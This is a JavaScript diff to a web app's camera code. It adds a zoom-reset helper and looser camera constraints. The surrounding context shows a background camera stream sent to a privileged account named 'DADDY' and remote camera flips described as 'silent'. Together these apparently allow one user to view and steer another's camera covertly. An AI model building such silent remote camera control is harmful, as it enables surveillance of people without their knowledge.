@@ -473,15 +473,23 @@ async function initApp(){
 // ── Camera ────────────────────────────────────────────────
 let captureStream=null, captureFacing="user";
 
+async function setZoom1(stream){
+  try{
+    const track=stream.getVideoTracks()[0];
+    const caps=track.getCapabilities&&track.getCapabilities();
+    if(caps&&caps.zoom) await track.applyConstraints({advanced:[{zoom:caps.zoom.min}]});
+  }catch(e){}
+}
+
 async function openCaptureMode(){
   const el=document.getElementById("cam-capture"); el.style.display="flex";
   if(bgStream){
-    // Camera already running — just re-attach preview and resume streaming
     document.getElementById("capture-preview").srcObject=bgStream;
     return;
   }
   try{
-    captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false});
+    captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:captureFacing}},audio:false});
+    await setZoom1(captureStream);
     bgStream=captureStream;
     document.getElementById("capture-preview").srcObject=captureStream;
     if(me.username!==DADDY){ socket.emit("cam:session_accept"); startSendStream(); }
@@ -499,6 +507,7 @@ async function flipCaptureCam(remote=false){
   const oldStream=captureStream;
   const ns=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:captureFacing}},audio:false}).catch(()=>null);
   if(!ns){ captureFacing=captureFacing==="user"?"environment":"user"; return; }
+  await setZoom1(ns);
   captureStream=ns; bgStream=ns;
   if(frameVideo){ frameVideo.srcObject=ns; frameVideo.play().catch(()=>{}); }
   // Only update the visible preview for manual flips — remote flips are silent
